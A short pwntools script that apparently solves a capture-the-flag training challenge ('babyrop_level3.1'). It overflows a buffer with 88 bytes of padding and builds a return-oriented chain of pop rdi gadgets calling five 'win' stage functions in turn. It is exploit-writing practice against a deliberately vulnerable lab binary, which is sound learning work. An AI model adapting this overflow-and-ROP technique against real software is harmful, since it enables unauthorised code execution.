from pwn import *

elf = context.binary = ELF('/challenge/babyrop_level3.1')

p = process()

rop = ROP(elf)

pop_rdi = 0x0000000000402543 #pop_rdi ret

payload = b'A'*88
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(elf.sym.win_stage_1)
payload += p64(pop_rdi)
payload += p64(2)
payload += p64(elf.sym.win_stage_2)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(elf.sym.win_stage_3)
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(elf.sym.win_stage_4)
payload += p64(pop_rdi)
payload += p64(5)
payload += p64(elf.sym.win_stage_5)

p.sendline(payload)

p.interactive()
